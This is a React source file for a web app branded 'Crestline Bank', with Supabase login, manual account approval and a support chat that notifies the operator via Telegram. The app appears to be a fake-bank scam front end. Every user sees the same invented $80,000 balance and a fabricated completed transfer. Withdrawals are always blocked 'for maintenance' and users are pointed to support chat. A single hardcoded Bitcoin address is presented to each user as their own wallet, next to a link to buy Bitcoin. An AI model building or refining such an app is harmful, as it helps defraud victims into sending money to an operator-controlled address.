import { useEffect, useState } from 'react'
import { supabase } from './supabase'
import './App.css'

function App() {
  const [session, setSession] = useState(null)
  const [loading, setLoading] = useState(true)

  // --------------------------------------------------
  // PROFILE
  // --------------------------------------------------

  const [profileName, setProfileName] = useState('')

  // --------------------------------------------------
  // AUTH
  // --------------------------------------------------

  const [authMode, setAuthMode] = useState('login')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [fullName, setFullName] = useState('')
  const [authLoading, setAuthLoading] = useState(false)
  const [authMessage, setAuthMessage] = useState('')

  // --------------------------------------------------
  // APPROVAL
  // --------------------------------------------------

  const [approved, setApproved] = useState(false)
  const [checkingApproval, setCheckingApproval] = useState(false)

  // --------------------------------------------------
  // CUSTOMER SUPPORT
  // --------------------------------------------------

  const [showSupport, setShowSupport] = useState(false)
  const [supportMessage, setSupportMessage] = useState('')
  const [sendingMessage, setSendingMessage] = useState(false)
  const [messages, setMessages] = useState([])

  // --------------------------------------------------
  // PAGES
  // --------------------------------------------------

  const [showWallet, setShowWallet] = useState(false)
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [showTransfer, setShowTransfer] = useState(false)
  const [showAbout, setShowAbout] = useState(false)
  const [showMenu, setShowMenu] = useState(false)

  // --------------------------------------------------
  // DEMO BTC WALLET ADDRESS
  // --------------------------------------------------

  const walletAddress =
    'bc1qwx90w9s588gyev4qrw45fe57gq5pwrhctte8f2'

  // --------------------------------------------------
  // CHECK LOGIN SESSION
  // --------------------------------------------------

  useEffect(() => {
    let mounted = true

    async function loadSession() {
      const {
        data: { session },
      } = await supabase.auth.getSession()

      if (!mounted) return

      setSession(session)
      setLoading(false)
    }

    loadSession()

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange(
      (_event, newSession) => {
        if (!mounted) return

        setSession(newSession)
        setLoading(false)
      }
    )

    return () => {
      mounted = false
      subscription.unsubscribe()
    }
  }, [])

  // --------------------------------------------------
  // LOAD PROFILE NAME
  // --------------------------------------------------

  useEffect(() => {
    let mounted = true

    async function loadProfile() {
      if (!session?.user?.id) {
        setProfileName('')
        return
      }

      const { data, error } = await supabase
        .from('profiles')
        .select('display_name')
        .eq('id', session.user.id)
        .maybeSingle()

      if (!mounted) return

      if (error) {
        console.error('Profile loading error:', error)
        setProfileName('')
        return
      }

      const storedName =
        typeof data?.display_name === 'string'
          ? data.display_name.trim()
          : ''

      setProfileName(storedName)
    }

    loadProfile()

    return () => {
      mounted = false
    }
  }, [session?.user?.id])

  // --------------------------------------------------
  // CHECK ACCOUNT APPROVAL
  // --------------------------------------------------

  useEffect(() => {
    let mounted = true

    async function checkApproval() {
      if (!session?.user?.id) {
        setApproved(false)
        return
      }

      setCheckingApproval(true)

      const { data, error } = await supabase
        .from('profiles')
        .select('approved')
        .eq('id', session.user.id)
        .maybeSingle()

      if (!mounted) return

      if (error) {
        console.error('Approval check error:', error)
        setApproved(false)
      } else {
        setApproved(data?.approved === true)
      }

      setCheckingApproval(false)
    }

    checkApproval()

    return () => {
      mounted = false
    }
  }, [session?.user?.id])

  // --------------------------------------------------
  // LOAD SUPPORT MESSAGES
  // --------------------------------------------------

  async function loadMessages() {
    if (!session?.user?.id) {
      return
    }

    const { data, error } = await supabase
      .from('support_messages')
      .select('*')
      .eq('user_id', session.user.id)
      .order('created_at', {
        ascending: true,
      })

    if (error) {
      console.error('Could not load messages:', error)
      return
    }

    setMessages(data || [])
  }

  useEffect(() => {
    if (!session?.user?.id || !approved) {
      setMessages([])
      return
    }

    loadMessages()

    const interval = setInterval(() => {
      loadMessages()
    }, 3000)

    return () => {
      clearInterval(interval)
    }
  }, [session?.user?.id, approved])

  // --------------------------------------------------
  // LOGIN
  // --------------------------------------------------

  async function handleLogin(e) {
    e.preventDefault()

    setAuthMessage('')
    setAuthLoading(true)

    const cleanEmail = email.trim()

    const { data, error } =
      await supabase.auth.signInWithPassword({
        email: cleanEmail,
        password,
      })

    setAuthLoading(false)

    if (error) {
      console.error('Login error:', error)

      setAuthMessage(
        error.message ||
          'Unable to sign in. Please check your details.'
      )

      return
    }

    setSession(data.session)

    setEmail('')
    setPassword('')
  }

  // --------------------------------------------------
  // SIGN UP
  // --------------------------------------------------

  async function handleSignUp(e) {
    e.preventDefault()

    setAuthMessage('')

    if (!fullName.trim()) {
      setAuthMessage('Please enter your name.')
      return
    }

    if (!email.trim()) {
      setAuthMessage('Please enter your email.')
      return
    }

    if (password.length < 6) {
      setAuthMessage(
        'Password must be at least 6 characters.'
      )
      return
    }

    if (password !== confirmPassword) {
      setAuthMessage('Passwords do not match.')
      return
    }

    setAuthLoading(true)

    const cleanEmail = email.trim()
    const cleanName = fullName.trim()

    const {
      data,
      error,
    } = await supabase.auth.signUp({
      email: cleanEmail,
      password,
      options: {
        data: {
          full_name: cleanName,
        },
      },
    })

    setAuthLoading(false)

    if (error) {
      console.error('Sign up error:', error)

      setAuthMessage(
        error.message ||
          'Unable to create your account.'
      )

      return
    }

    if (data.session) {
      setSession(data.session)

      setEmail('')
      setPassword('')
      setConfirmPassword('')
      setFullName('')
    } else {
      setAuthMessage(
        'Account created. Please check your email to confirm your account, then sign in.'
      )

      setAuthMode('login')
      setPassword('')
      setConfirmPassword('')
    }
  }

  // --------------------------------------------------
  // LOG OUT
  // --------------------------------------------------

  async function handleLogout() {
    await supabase.auth.signOut()

    setSession(null)
    setApproved(false)
    setProfileName('')

    setShowSupport(false)
    setShowWallet(false)
    setShowWithdraw(false)
    setShowTransfer(false)
    setShowAbout(false)
    setShowMenu(false)

    setMessages([])
    setSupportMessage('')

    setEmail('')
    setPassword('')
    setConfirmPassword('')
    setFullName('')
  }

  // --------------------------------------------------
  // SEND SUPPORT MESSAGE
  // --------------------------------------------------

  async function handleSendMessage() {
    const message = supportMessage.trim()

    if (!message) {
      return
    }

    if (!session?.user?.id) {
      alert('Please sign in first.')
      return
    }

    setSendingMessage(true)

    const userId = session.user.id

    const temporaryMessage = {
      id: `temporary-${Date.now()}`,
      user_id: userId,
      message,
      reply_text: null,
      created_at: new Date().toISOString(),
      temporary: true,
    }

    setMessages((previous) => [
      ...previous,
      temporaryMessage,
    ])

    setSupportMessage('')

    const { data, error } = await supabase
      .from('support_messages')
      .insert([
        {
          user_id: userId,
          message,
          customer_name:
            profileName ||
            session.user.email ||
            'Customer',
        },
      ])
      .select()
      .single()

    if (error) {
      console.error(
        'Supabase message error:',
        error
      )

      setMessages((previous) =>
        previous.filter(
          (item) =>
            item.id !== temporaryMessage.id
        )
      )

      setSupportMessage(message)
      setSendingMessage(false)

      alert(
        'Unable to send the message. Please try again.'
      )

      return
    }

    setMessages((previous) =>
      previous.map((item) =>
        item.id === temporaryMessage.id
          ? data
          : item
      )
    )

    // Telegram notification
    try {
      const {
        error: telegramError,
      } = await supabase.functions.invoke(
        'send-telegram',
        {
          body: {
            message,
            support_message_id: data.id,
            user_id: userId,
            customer_email:
              session.user.email,
          },
        }
      )

      if (telegramError) {
        console.error(
          'Telegram notification error:',
          telegramError
        )
      }
    } catch (telegramError) {
      console.error(
        'Telegram function error:',
        telegramError
      )
    }

    setSendingMessage(false)
  }

  // --------------------------------------------------
  // SUPPORT SCREEN
  // --------------------------------------------------

  function SupportBox() {
    return (
      <div className="messages-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowSupport(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            C
          </div>

          <div className="messages-title">

            <strong>
              Customer Support
            </strong>

            <span>
              ● Online
            </span>

          </div>

        </div>

        <div className="messages-conversation">

          {messages.length === 0 && (
            <div className="conversation-intro">

              <div className="intro-icon">
                💬
              </div>

              <h2>
                Customer Support
              </h2>

              <p>
                How can we help you?
              </p>

            </div>
          )}

          {messages.map((item) => (
            <div
              className="conversation-group"
              key={item.id}
            >

              {item.message && (
                <div className="message-row customer-row">

                  <div className="message-content">

                    <div className="message-bubble customer-bubble">
                      {item.message}
                    </div>

                    <div className="message-time">
                      {item.temporary
                        ? 'Sending...'
                        : 'Now'}
                    </div>

                  </div>

                </div>
              )}

              {item.reply_text && (
                <div className="message-row support-row">

                  <div className="support-message-content">

                    <div className="message-bubble support-bubble">

                      <strong>
                        Customer Support
                      </strong>

                      <div>
                        {item.reply_text}
                      </div>

                    </div>

                    <div className="message-time support-time">
                      Now
                    </div>

                  </div>

                </div>
              )}

            </div>
          ))}

          <div className="bottom-space" />

        </div>

        <div className="message-input-area">

          <div className="message-input-wrapper">

            <textarea
              value={supportMessage}
              onChange={(e) =>
                setSupportMessage(e.target.value)
              }
              placeholder="Type a message..."
              rows={1}
              disabled={sendingMessage}
              onKeyDown={(e) => {

                if (
                  e.key === 'Enter' &&
                  !e.shiftKey
                ) {
                  e.preventDefault()

                  if (
                    !sendingMessage &&
                    supportMessage.trim()
                  ) {
                    handleSendMessage()
                  }
                }

              }}
            />

            <button
              type="button"
              className="send-message-button"
              disabled={
                sendingMessage ||
                !supportMessage.trim()
              }
              onClick={handleSendMessage}
            >
              {sendingMessage ? '...' : '➤'}
            </button>

          </div>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WALLET SCREEN
  // --------------------------------------------------

  function WalletBox() {

    async function copyWalletAddress() {
      try {
        await navigator.clipboard.writeText(
          walletAddress
        )

        alert('Wallet address copied!')
      } catch (error) {
        console.error(
          'Copy failed:',
          error
        )

        alert(
          'Unable to copy automatically. Please copy the address manually.'
        )
      }
    }

    return (
      <div className="messages-page wallet-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowWallet(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            ₿
          </div>

          <div className="messages-title">

            <strong>
              Bitcoin Wallet
            </strong>

            <span>
              BTC
            </span>

          </div>

        </div>

        <div className="wallet-content">

          <div className="wallet-icon">
            ₿
          </div>

          <h1>
            Your Bitcoin Wallet
          </h1>

          <p className="wallet-description">
            This is your Bitcoin wallet address.
          </p>

          <div className="wallet-address-card">

            <p className="wallet-address-label">
              BTC Wallet Address
            </p>

            <div className="wallet-address">
              {walletAddress}
            </div>

            <button
              type="button"
              className="card-button copy-wallet-button"
              onClick={copyWalletAddress}
            >
              📋 Copy Address
            </button>

          </div>

          <div className="wallet-info">

            <strong>
              Information
            </strong>

            <p>
              Address Information

              Your registered address and contact details associated with your account.
            </p>

          </div>

          <a
            className="card-button changelly-button"
            href="https://changelly.com/buy/btc"
            target="_blank"
            rel="noopener noreferrer"
          >
            ₿ Buy Bitcoin with Changelly
          </a>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowWallet(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // TRANSFER SCREEN
  // --------------------------------------------------

  function TransferBox() {
    return (
      <div className="messages-page transfer-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowTransfer(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            ↗️
          </div>

          <div className="messages-title">

            <strong>
              Transfer
            </strong>

            <span>
              Transaction History
            </span>

          </div>

        </div>

        <div className="transfer-content">

          <div className="transfer-icon">
            ✓
          </div>

          <h1>
            Last Transfer
          </h1>

          <p className="transfer-description">
            Your most recent transaction
            record.
          </p>

          <div className="transaction-card">

            <div className="transaction-row">
              <span>
                Recipient
              </span>

              <strong>
                Alex JOhn
              </strong>
            </div>

            <div className="transaction-row">
              <span>
                Amount
              </span>

              <strong>
                $2,500.00
              </strong>
            </div>

            <div className="transaction-row">
              <span>
                Date
              </span>

              <strong>
                July 12, 2026
              </strong>
            </div>

            <div className="transaction-row">
              <span>
                Type
              </span>

              <strong>
                Demo Bank Transfer
              </strong>
            </div>

            <div className="transaction-row">
              <span>
                Status
              </span>

              <strong className="transaction-status">
                Completed
              </strong>
            </div>

          </div>

          <div className="demo-notice">

            <strong>
              Transaction
            </strong>

            <p>
              Crestline Bank helps you manage your money and support your business with simple, secure banking services.
            </p>

          </div>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowTransfer(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WITHDRAW SCREEN
  // --------------------------------------------------

  function WithdrawBox() {
    return (
      <div className="messages-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowWithdraw(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            $
          </div>

          <div className="messages-title">

            <strong>
              Withdraw
            </strong>

            <span>
              Account Services
            </span>

          </div>

        </div>

        <div className="withdraw-content">

          <div className="withdraw-icon">
            🔧
          </div>

          <h1>
            Withdraw Unavailable
          </h1>

          <p>
            This service is currently unavailable
            because the site is undergoing maintenance.
          </p>

          <div className="maintenance-box">

            <strong>
              Site Maintenance
            </strong>

            <p>
              Please try again later or contact
              Customer Support if you need assistance.
            </p>

          </div>

          <button
            type="button"
            className="card-button"
            onClick={() => {
              setShowWithdraw(false)
              setShowSupport(true)
              loadMessages()
            }}
          >
            💬 Contact Customer Support
          </button>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowWithdraw(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // ABOUT SCREEN
  // --------------------------------------------------

  function AboutBox() {
    return (
      <div className="messages-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowAbout(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            ◆
          </div>

          <div className="messages-title">

            <strong>
              About Crestline Bank
            </strong>

            <span>
              Personal Banking
            </span>

          </div>

        </div>

        <div className="about-content">

          <div className="about-card">

            <div className="about-logo">
              ◆
            </div>

            <h1>
              Crestline Bank
            </h1>

            <h3>
              Crestline Account
            </h3>

            <p>
              Crestline Bank was created to help users, manage finances and support their business activities. It give convenient and secure way to handle personal funds, manage business-related expenses, and keep financial affairs organized. The account is intended for their financial needs and business support.
            </p>

            <p>
              This demo includes account information,
              wallet information, transfers, withdrawals,
              and customer support features.
            </p>

            <div className="demo-notice">

              <strong>
                Account
              </strong>

              <p>
                Crestline Bank provides secure and convenient personal banking services designed to help you manage your finances and support your business needs with ease.
              </p>

            </div>

          </div>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowAbout(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // MENU SCREEN
  // --------------------------------------------------

  function MenuBox() {
    return (
      <div className="messages-page menu-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowMenu(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            ☰
          </div>

          <div className="messages-title">

            <strong>
              Menu
            </strong>

            <span>
              Account Services
            </span>

          </div>

        </div>

        <div className="menu-content">

          <h1>
            Account Menu
          </h1>

          <p className="menu-description">
            Choose an option below.
          </p>

          <div className="menu-options">

            <button
              type="button"
              className="menu-option"
              onClick={() => {
                setShowMenu(false)
                setShowTransfer(true)
              }}
            >
              <span className="menu-option-icon">
                ↗️
              </span>

              <span className="menu-option-text">
                <strong>
                  Transfer
                </strong>

                <small>
                  View your transfer history
                </small>
              </span>
            </button>

            <button
              type="button"
              className="menu-option"
              onClick={() => {
                setShowMenu(false)
                setShowWithdraw(true)
              }}
            >
              <span className="menu-option-icon">
                $
              </span>

              <span className="menu-option-text">
                <strong>
                  Withdraw
                </strong>

                <small>
                  Withdrawal services
                </small>
              </span>
            </button>

            <button
              type="button"
              className="menu-option"
              onClick={() => {
                setShowMenu(false)
                setShowWallet(true)
              }}
            >
              <span className="menu-option-icon">
                ₿
              </span>

              <span className="menu-option-text">
                <strong>
                  Bitcoin Wallet
                </strong>

                <small>
                  View BTC wallet information
                </small>
              </span>
            </button>

            <button
              type="button"
              className="menu-option"
              onClick={() => {
                setShowMenu(false)
                setShowAbout(true)
              }}
            >
              <span className="menu-option-icon">
                ℹ
              </span>

              <span className="menu-option-text">
                <strong>
                  About
                </strong>

                <small>
                  Learn about Crestline Bank
                </small>
              </span>
            </button>

            <button
              type="button"
              className="menu-option"
              onClick={() => {
                setShowMenu(false)
                setShowSupport(true)
                loadMessages()
              }}
            >
              <span className="menu-option-icon">
                💬
              </span>

              <span className="menu-option-text">
                <strong>
                  Customer Support
                </strong>

                <small>
                  Contact customer support
                </small>
              </span>
            </button>

          </div>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // LOADING
  // --------------------------------------------------

  if (loading) {
    return (
      <div className="app">

        <div className="login-card">

          <h1>
            Loading...
          </h1>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // LOGIN / SIGN UP
  // --------------------------------------------------

  if (!session) {

    const isLogin =
      authMode === 'login'

    return (
      <div className="app">

        <div className="login-card">

          <div className="bank-logo">
            ◆
          </div>

          <h1>
            {isLogin
              ? 'Welcome Back'
              : 'Create Account'}
          </h1>

          <p className="subtitle">
            {isLogin
              ? 'Sign in to your account'
              : 'Create your personal account'}
          </p>

          {authMessage && (
            <div className="auth-message">
              {authMessage}
            </div>
          )}

          <form
            onSubmit={
              isLogin
                ? handleLogin
                : handleSignUp
            }
          >

            {!isLogin && (
              <>
                <label>
                  Full Name
                </label>

                <input
                  type="text"
                  value={fullName}
                  onChange={(e) =>
                    setFullName(e.target.value)
                  }
                  placeholder="Enter your name"
                  autoComplete="name"
                />
              </>
            )}

            <label>
              Email
            </label>

            <input
              type="email"
              value={email}
              onChange={(e) =>
                setEmail(e.target.value)
              }
              placeholder="Enter your email"
              autoComplete={
                isLogin
                  ? 'email'
                  : 'new-email'
              }
            />

            <label>
              Password
            </label>

            <input
              type="password"
              value={password}
              onChange={(e) =>
                setPassword(e.target.value)
              }
              placeholder="Enter password"
              autoComplete={
                isLogin
                  ? 'current-password'
                  : 'new-password'
              }
            />

            {!isLogin && (
              <>
                <label>
                  Confirm Password
                </label>

                <input
                  type="password"
                  value={confirmPassword}
                  onChange={(e) =>
                    setConfirmPassword(
                      e.target.value
                    )
                  }
                  placeholder="Confirm password"
                  autoComplete="new-password"
                />
              </>
            )}

            <button
              className="sign-in-button"
              type="submit"
              disabled={authLoading}
            >
              {authLoading
                ? 'Please wait...'
                : isLogin
                ? 'Sign In'
                : 'Create Account'}
            </button>

          </form>

          <button
            type="button"
            className="auth-switch-button"
            onClick={() => {
              setAuthMessage('')

              setAuthMode(
                isLogin
                  ? 'signup'
                  : 'login'
              )
            }}
          >
            {isLogin
              ? "Don't have an account? Create one"
              : 'Already have an account? Sign in'}
          </button>

          <div className="login-footer">

            <span>
              🔒 Secure connection
            </span>

            <span>
              •
            </span>

            <span>
              Crestline Bank
            </span>

          </div>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // CHECKING APPROVAL
  // --------------------------------------------------

  if (checkingApproval) {

    return (
      <div className="app">

        <div className="login-card">

          <h1>
            Please wait...
          </h1>

          <p className="subtitle">
            Checking your account approval.
          </p>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WAITING FOR APPROVAL
  // --------------------------------------------------

  if (!approved) {

    return (
      <div className="app">

        <div className="login-card">

          <div className="bank-logo">
            ◆
          </div>

          <h1>
            Account Pending
          </h1>

          <p className="subtitle">
            Your account is waiting for approval.
          </p>

          <div className="auth-message">
            Your account has been created successfully.
            Please wait for approval before accessing
            the dashboard.
          </div>

          <button
            type="button"
            className="sign-in-button"
            onClick={handleLogout}
          >
            Sign Out
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // INDIVIDUAL PAGES
  // --------------------------------------------------

  if (showMenu) {
    return (
      <div className="dashboard">
        {MenuBox()}
      </div>
    )
  }

  if (showWallet) {
    return (
      <div className="dashboard">
        {WalletBox()}
      </div>
    )
  }

  if (showWithdraw) {
    return (
      <div className="dashboard">
        {WithdrawBox()}
      </div>
    )
  }

  if (showTransfer) {
    return (
      <div className="dashboard">
        {TransferBox()}
      </div>
    )
  }

  if (showAbout) {
    return (
      <div className="dashboard">
        {AboutBox()}
      </div>
    )
  }

  if (showSupport) {
    return (
      <div className="dashboard">
        {SupportBox()}
      </div>
    )
  }

  // --------------------------------------------------
  // USER NAME
  // --------------------------------------------------

  const displayName =
    profileName ||
    session.user.email?.split('@')[0] ||
    'Customer'

  // --------------------------------------------------
  // MAIN DASHBOARD
  // --------------------------------------------------

  return (
    <div className="dashboard">

      <header className="dashboard-header">

        <div className="brand-area">

          <div className="brand">
            ◆ Crestline Bank
          </div>

          <span>
            Personal Banking
          </span>

        </div>

        <button
          type="button"
          className="logout-button"
          onClick={handleLogout}
        >
          Log Out
        </button>

      </header>

      <main className="dashboard-content">

        {/* MENU BUTTON */}

        <button
          type="button"
          className="menu-button"
          aria-label="Open menu"
          onClick={() => setShowMenu(true)}
        >
          ☰
        </button>

        {/* WELCOME */}

        <h1>
          Welcome back, {displayName}
        </h1>

        <p className="welcome-text">
          Welcome to your account.
        </p>

        {/* BALANCE */}

        <section className="balance-card">

          <p>
            Available Balance
          </p>

          <h2>
            $80,000.00
          </h2>

          <span>
            Balance
          </span>

        </section>

        {/* DASHBOARD FEATURES */}

        <div className="dashboard-grid">

          {/* CUSTOMER SUPPORT */}

          <div className="feature-card">

            <h3>
              💬 Customer Support
            </h3>

            <p>
              Have a question? Contact customer support.
            </p>

            <button
              type="button"
              className="card-button"
              onClick={() => {
                setShowSupport(true)
                loadMessages()
              }}
            >
              Messages
            </button>

          </div>

          {/* BITCOIN WALLET */}

          <div className="feature-card">

            <h3>
              ₿ Bitcoin Wallet
            </h3>

            <p>
              View your BTC wallet information.
            </p>

            <button
              type="button"
              className="card-button"
              onClick={() => setShowWallet(true)}
            >
              Open Wallet
            </button>

          </div>

          {/* TRANSFER */}

          <div className="feature-card">

            <h3>
              ↗️ Transfer
            </h3>

            <p>
              View your previous transfer.
            </p>

            <button
              type="button"
              className="card-button"
              onClick={() => setShowTransfer(true)}
            >
              Transfer
            </button>

          </div>

          {/* WITHDRAW */}

          <div className="feature-card">

            <h3>
              💸 Withdraw
            </h3>

            <p>
              Withdrawal services.
            </p>

            <button
              type="button"
              className="card-button"
              onClick={() => setShowWithdraw(true)}
            >
              Withdraw
            </button>

          </div>

        </div>

        {/* DEMO NOTICE */}

        <div className="demo-notice">

          <strong>
            Crestline Bank D
          </strong>

          <p>
            Crestline Bank provides secure and convenient personal banking services designed to help you manage your finances and support your business needs with ease.
          </p>

        </div>

      </main>

    </div>
  )
}

export default App